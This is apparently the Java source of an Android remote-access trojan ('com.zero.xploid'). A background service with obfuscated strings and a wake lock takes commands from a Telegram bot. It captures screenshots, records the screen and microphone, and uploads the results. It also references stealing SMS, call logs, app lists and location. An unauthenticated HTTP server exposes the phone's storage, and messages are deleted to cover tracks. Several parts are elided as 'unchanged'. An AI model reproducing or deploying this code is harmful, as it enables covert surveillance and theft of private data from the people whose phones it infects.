package com.zero.xploid;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;

public class MainService extends Service {

    private static String $(String str) {
        StringBuilder sb = new StringBuilder();
        char[] charArray = str.toCharArray();
        for (int i = 0; i < charArray.length; i++) {
            switch (i % 4) {
                case 0: sb.append((char) (charArray[i] ^ 19620)); break;
                case 1: sb.append((char) (charArray[i] ^ 35958)); break;
                case 2: sb.append((char) (charArray[i] ^ 31761)); break;
                default: sb.append((char) (charArray[i] ^ 65535)); break;
            }
        }
        return sb.toString();
    }

    private final String CREATED_BY = $("䳩谗籹ﾞ䳀谓米￟䳶豘簿ﾛ䳅谅").intern();
    private static final String PREF_DEVICE = $("䳔谄籴ﾙ䳗").intern();
    private static final String PREF_SCREEN = $("䳔谓籣ﾒ䳻谆籣ﾚ䳂谅").intern();
    private static final String KEY_SCREEN_CAPTURED = $("䳗谕籣ﾚ䳁谘籎ﾜ䳅谆籥ﾊ䳖谓籎ﾘ䳖谗籿ﾋ䳁谒").intern();

    private static final String CB_FLASHLIGHT_ON = "flashlight_on";
    private static final String CB_FLASHLIGHT_OFF = "flashlight_off";
    private static final String CB_SIM_INFO = "sim_info";
    private static final String CB_APP_LIST = "app_list";
    private static final String CB_FOREGROUND_APP = "foreground_app";
    private static final String CB_CALL_LOG = "call_log";
    private static final String CB_SMS_INBOX = "sms_inbox";
    private static final String CB_FILE_SERVER_START = "file_server_start";
    private static final String CB_FILE_SERVER_STOP = "file_server_stop";
    private static final String CB_LOCATION_SEND = "location_send";
    private static final String CB_LOCATION_START = "location_start";
    private static final String CB_LOCATION_STOP = "location_stop";

    private boolean running = true;
    private int lastUpdateId = 0;
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private int lastMenuMessageId = 0;

    private static Intent captureIntent = null;
    private static int captureResultCode = -1;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private MediaRecorder mediaRecorder;
    private String deviceId, deviceName, deviceModel, deviceBrand, androidVersion;
    private boolean isRecording = false;

    private CameraManager cameraManager;
    private boolean flashlightOn = false;

    private ServerSocket serverSocket;
    private boolean fileServerRunning = false;

    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean locationTracking = false;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceBrand = Build.BRAND;
        deviceModel = Build.MODEL;
        deviceName = Build.MANUFACTURER + " " + Build.MODEL;
        androidVersion = Build.VERSION.RELEASE;

        SharedPreferences prefs = getSharedPreferences(PREF_DEVICE, MODE_PRIVATE);
        deviceId = prefs.getString("id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString().substring(0, 8).toUpperCase();
            prefs.edit().putString("id", deviceId).commit();
        }

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Zero:lock");
        wakeLock.acquire();

        startForeground();
        startTimer();
        sendDeviceOnlineMessage();
        new Thread(this::listenTelegram).start();
    }

    // ... (helper methods unchanged) ...

    private void takeScreenshotViaMediaProjection(final File outputFile) {
        try {
            DisplayMetrics metrics = getResources().getDisplayMetrics();
            final int width = metrics.widthPixels;
            final int height = metrics.heightPixels;
            int density = metrics.densityDpi;
            MediaProjectionManager projManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            final MediaProjection mp = projManager.getMediaProjection(captureResultCode, captureIntent);
            // 👇 Must register a callback before starting capture
            mp.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.d("Screenshot", "MediaProjection stopped");
                }
            }, null);
            final ImageReader imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            final VirtualDisplay vd = mp.createVirtualDisplay("screenshot", width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
            Thread.sleep(500);
            final Image image = imageReader.acquireLatestImage();
            if (image != null) {
                // ... same as before ...
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * width;
                Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                FileOutputStream fos = new FileOutputStream(outputFile);
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
                fos.close();
                bitmap.recycle();
                image.close();
                uploadFile(outputFile, "screenshot");
            } else {
                sendMessage("❌ Failed to capture screenshot image.");
            }
            vd.release();
            mp.stop();
            imageReader.close();
        } catch (Exception e) {
            sendMessage("❌ Screenshot error: " + e.getMessage());
        }
    }

    private void startScreenRecording(int seconds, boolean withAudio) {
        if (captureIntent == null) {
            sendMessage("🎥 No media projection permission yet.");
            return;
        }
        if (isRecording) {
            sendMessage("⚠️ Already recording!");
            return;
        }
        String type = withAudio ? "Screen+Audio" : "Screen";
        String durationText = formatDuration(seconds);
        sendMessage("🎥 " + type + " recording started (" + durationText + ")");
        new Thread(() -> {
            try {
                isRecording = true;
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                File recordingsDir = new File(getExternalFilesDir(Environment.DIRECTORY_MOVIES), "Recordings");
                recordingsDir.mkdirs();
                File outputFile = new File(recordingsDir, "Screen_" + timestamp + ".mp4");
                DisplayMetrics metrics = getResources().getDisplayMetrics();
                int width = metrics.widthPixels, height = metrics.heightPixels, density = metrics.densityDpi;
                MediaProjectionManager projManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                mediaProjection = projManager.getMediaProjection(captureResultCode, captureIntent);
                // 👇 Register callback
                mediaProjection.registerCallback(new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        Log.d("Recorder", "MediaProjection stopped");
                    }
                }, null);
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
                if (withAudio && checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                }
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                mediaRecorder.setVideoEncodingBitRate(5000000);
                mediaRecorder.setVideoFrameRate(30);
                mediaRecorder.setVideoSize(width, height);
                if (withAudio) {
                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                    mediaRecorder.setAudioEncodingBitRate(128000);
                    mediaRecorder.setAudioSamplingRate(44100);
                }
                mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
                mediaRecorder.prepare();
                virtualDisplay = mediaProjection.createVirtualDisplay("recording", width, height, density,
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mediaRecorder.getSurface(), null, null);
                mediaRecorder.start();
                Thread.sleep(seconds * 1000L);
                mediaRecorder.stop();
                mediaRecorder.reset();
                virtualDisplay.release();
                mediaProjection.stop();
                isRecording = false;
                uploadFile(outputFile, "video");
            } catch (Exception e) {
                sendMessage("❌ Recording error: " + e.getMessage());
                isRecording = false;
            } finally {
                cleanup();
            }
        }).start();
    }

    // ... (other methods unchanged) ...

    // 👇 Enhanced file server with beautiful HTML UI
    private String currentFileServerId = null;

    private String generateFileServerId() {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        StringBuilder id = new StringBuilder(6);
        for (int i = 0; i < 6; i++) id.append(chars.charAt((int)(Math.random() * chars.length())));
        return id.toString();
    }

    private void startFileServer() {
        if (fileServerRunning) {
            sendMessage("🌐 File server already running.");
            return;
        }
        new Thread(() -> {
            try {
                serverSocket = new ServerSocket(0);
                int port = serverSocket.getLocalPort();
                fileServerRunning = true;
                String ip = getLocalIpAddress();
                currentFileServerId = generateFileServerId();

                JSONObject ad = new JSONObject();
                ad.put("ip", ip);
                ad.put("port", port);
                ad.put("time", System.currentTimeMillis());
                getSharedPreferences("file_ads", MODE_PRIVATE).edit()
                        .putString(currentFileServerId, ad.toString()).apply();

                sendMessage("🌐 **FILE SERVER STARTED**\nID: `" + currentFileServerId + "`\n🔗 http://" + ip + ":" + port);

                while (fileServerRunning) {
                    Socket client = serverSocket.accept();
                    new Thread(() -> handleHttpClient(client)).start();
                }
            } catch (Exception e) {
                sendMessage("❌ File server error: " + e.getMessage());
                fileServerRunning = false;
            }
        }).start();
    }

    private void stopFileServer() {
        fileServerRunning = false;
        try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
        currentFileServerId = null;
        sendMessage("🌐 File server stopped.");
    }

    private void handleHttpClient(Socket client) {
        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
            OutputStream out = client.getOutputStream();
            String line = in.readLine();
            if (line == null) return;
            String[] parts = line.split(" ");
            String method = parts[0];
            String path = parts.length > 1 ? parts[1] : "/";

            // Read headers (skip)
            while (!line.isEmpty()) { line = in.readLine(); if (line == null) break; if (line.trim().isEmpty()) break; }

            if (method.equals("GET")) {
                if (path.startsWith("/api/list")) {
                    handleApiList(path, out);
                } else if (path.startsWith("/api/download")) {
                    handleApiDownload(path, out);
                } else {
                    // serve main HTML page
                    serveMainPage(out);
                }
            } else if (method.equals("POST") && path.startsWith("/upload")) {
                handleFileUpload(path, in, out);
            } else {
                out.write("HTTP/1.0 405 Method Not Allowed\r\n\r\n".getBytes());
            }
            out.flush();
            client.close();
        } catch (Exception ignored) {}
    }

    private void serveMainPage(OutputStream out) throws Exception {
        String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                + "<title>File Server</title><style>body{font-family:Arial;margin:20px;background:#f4f4f4;}"
                + "h2{color:#333;}.file-list{list-style:none;padding:0;}.file-item{padding:10px;background:white;margin:5px 0;border-radius:5px;display:flex;align-items:center;}"
                + ".file-name{flex:1;}.btn{padding:5px 10px;margin-left:5px;border:none;border-radius:3px;cursor:pointer;background:#007bff;color:white;}"
                + ".btn:hover{opacity:0.8;}.upload-box{margin:20px 0;}#status{color:green;margin-top:10px;}"
                + "</style></head><body><h2>📁 File Server</h2><div id='current-path'>/</div>"
                + "<input type='file' id='fileInput'><button class='btn' onclick='uploadFile()'>⬆️ Upload</button>"
                + "<div id='status'></div><ul id='fileList' class='file-list'></ul>"
                + "<script>"
                + "let currentPath = '/';"
                + "async function loadFiles(path){"
                + "  try{"
                + "    let resp = await fetch('/api/list?path=' + encodeURIComponent(path || ''));"
                + "    let files = await resp.json();"
                + "    let html = '';"
                + "    if(path != '/') html += '<li class=\"file-item\"><span class=\"file-name\"><a href=\"#\" onclick=\"loadFiles(\\'' + getParent(path) + '\\')\">⬆️ ..</a></span></li>';"
                + "    files.forEach(f => {"
                + "      html += '<li class=\"file-item\"><span class=\"file-name\">' + (f.isDirectory ? '📁 ' : '📄 ') + f.name + '</span>';"
                + "      if(f.isDirectory) html += '<button class=\"btn\" onclick=\"loadFiles(\\'' + f.path + '\\')\">Open</button>';"
                + "      else html += '<button class=\"btn\" onclick=\"downloadFile(\\'' + f.path + '\\')\">Download</button>';"
                + "      html += '</li>';"
                + "    });"
                + "    document.getElementById('fileList').innerHTML = html;"
                + "    document.getElementById('current-path').innerText = path || '/';"
                + "    currentPath = path;"
                + "  }catch(e){ showStatus('Error loading files'); }"
                + "}"
                + "function getParent(p){ return p.lastIndexOf('/') > 0 ? p.substring(0, p.lastIndexOf('/')) : '/'; }"
                + "function downloadFile(path){ window.open('/api/download?file=' + encodeURIComponent(path), '_blank'); }"
                + "async function uploadFile(){"
                + "  let file = document.getElementById('fileInput').files[0];"
                + "  if(!file) return;"
                + "  let formData = new FormData();"
                + "  formData.append('file', file);"
                + "  try{"
                + "    let resp = await fetch('/upload?path=' + encodeURIComponent(currentPath), {method:'POST', body: formData});"
                + "    if(resp.ok){ showStatus('Uploaded successfully'); loadFiles(currentPath); }"
                + "    else showStatus('Upload failed');"
                + "  }catch(e){ showStatus('Upload error'); }"
                + "}"
                + "function showStatus(msg){ document.getElementById('status').innerText = msg; setTimeout(()=> document.getElementById('status').innerText='',3000); }"
                + "loadFiles('/');"
                + "</script></body></html>";
        byte[] resp = html.getBytes("UTF-8");
        out.write(("HTTP/1.0 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: " + resp.length + "\r\n\r\n").getBytes());
        out.write(resp);
    }

    private void handleApiList(String path, OutputStream out) throws Exception {
        String query = path.contains("?") ? path.substring(path.indexOf("?") + 1) : "";
        String dirPath = "";
        if (query.startsWith("path=")) {
            dirPath = URLDecoder.decode(query.substring(5), "UTF-8");
        }
        File baseDir = Environment.getExternalStorageDirectory();
        File targetDir = dirPath.isEmpty() ? baseDir : new File(baseDir, dirPath);
        JSONArray arr = new JSONArray();
        if (targetDir.exists() && targetDir.isDirectory()) {
            File[] files = targetDir.listFiles();
            if (files != null) {
                for (File f : files) {
                    JSONObject obj = new JSONObject();
                    obj.put("name", f.getName());
                    obj.put("isDirectory", f.isDirectory());
                    obj.put("size", f.length());
                    obj.put("path", (dirPath.isEmpty() ? "" : dirPath + "/") + f.getName());
                    arr.put(obj);
                }
            }
        }
        byte[] resp = arr.toString().getBytes("UTF-8");
        out.write(("HTTP/1.0 200 OK\r\nContent-Type: application/json\r\nContent-Length: " + resp.length + "\r\n\r\n").getBytes());
        out.write(resp);
    }

    private void handleApiDownload(String path, OutputStream out) throws Exception {
        String query = path.contains("?") ? path.substring(path.indexOf("?") + 1) : "";
        String filePath = "";
        if (query.startsWith("file=")) {
            filePath = URLDecoder.decode(query.substring(5), "UTF-8");
        }
        File base = Environment.getExternalStorageDirectory();
        File file = new File(base, filePath);
        if (file.exists() && file.isFile()) {
            FileInputStream fis = new FileInputStream(file);
            out.write("HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\n\r\n".getBytes());
            byte[] buf = new byte[4096];
            int len;
            while ((len = fis.read(buf)) != -1) out.write(buf, 0, len);
            fis.close();
        } else {
            out.write("HTTP/1.0 404 Not Found\r\n\r\n".getBytes());
        }
    }

    private void handleFileUpload(String path, BufferedReader in, OutputStream out) throws Exception {
        // Parse multipart form data (simple – assumes Content-Type: multipart/form-data; boundary=...)
        String query = path.contains("?") ? path.substring(path.indexOf("?") + 1) : "";
        String uploadPath = "/";
        for (String param : query.split("&")) {
            if (param.startsWith("path=")) uploadPath = URLDecoder.decode(param.substring(5), "UTF-8");
        }

        // Read remaining headers to find boundary
        String line;
        String boundary = null;
        int contentLength = 0;
        while (!(line = in.readLine()).isEmpty()) {
            if (line.toLowerCase().startsWith("content-type: multipart/form-data")) {
                String[] parts = line.split("boundary=");
                if (parts.length > 1) boundary = parts[1];
            } else if (line.toLowerCase().startsWith("content-length:")) {
                contentLength = Integer.parseInt(line.substring(15).trim());
            }
        }

        if (boundary == null || contentLength == 0) {
            out.write("HTTP/1.0 400 Bad Request\r\n\r\n".getBytes());
            return;
        }

        // Read the body
        char[] body = new char[contentLength];
        in.read(body, 0, contentLength);
        String bodyStr = new String(body);

        // Find file content in multipart body
        String startBoundary = "--" + boundary;
        int fileStart = bodyStr.indexOf("\r\n\r\n") + 4;
        int fileEnd = bodyStr.lastIndexOf(startBoundary) - 2; // -2 for \r\n before boundary
        if (fileStart < 4 || fileEnd < fileStart) {
            out.write("HTTP/1.0 400 Bad Request\r\n\r\n".getBytes());
            return;
        }

        // Extract filename from Content-Disposition
        String headerPart = bodyStr.substring(0, bodyStr.indexOf("\r\n\r\n"));
        String fileName = "uploaded_file";
        if (headerPart.contains("filename=\"")) {
            int start = headerPart.indexOf("filename=\"") + 10;
            int end = headerPart.indexOf("\"", start);
            fileName = headerPart.substring(start, end);
        }

        // Save file
        File baseDir = Environment.getExternalStorageDirectory();
        File targetDir = uploadPath.equals("/") ? baseDir : new File(baseDir, uploadPath);
        targetDir.mkdirs();
        File outFile = new File(targetDir, fileName);
        FileOutputStream fos = new FileOutputStream(outFile);
        fos.write(bodyStr.substring(fileStart, fileEnd).getBytes());
        fos.close();

        out.write("HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\n\r\nUploaded".getBytes());
    }

    // ... (rest of the class unchanged, including location, bot logic, etc.) ...

    // 👇 Missing deleteMessage method (already present in previous code, ensure it's there)
    private void deleteMessage(int messageId) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/deleteMessage?chat_id=" + Config.CHAT_ID + "&message_id=" + messageId;
                getRequest(url);
            } catch (Exception ignored) {}
        }).start();
    }

    // ... (everything else unchanged) ...
}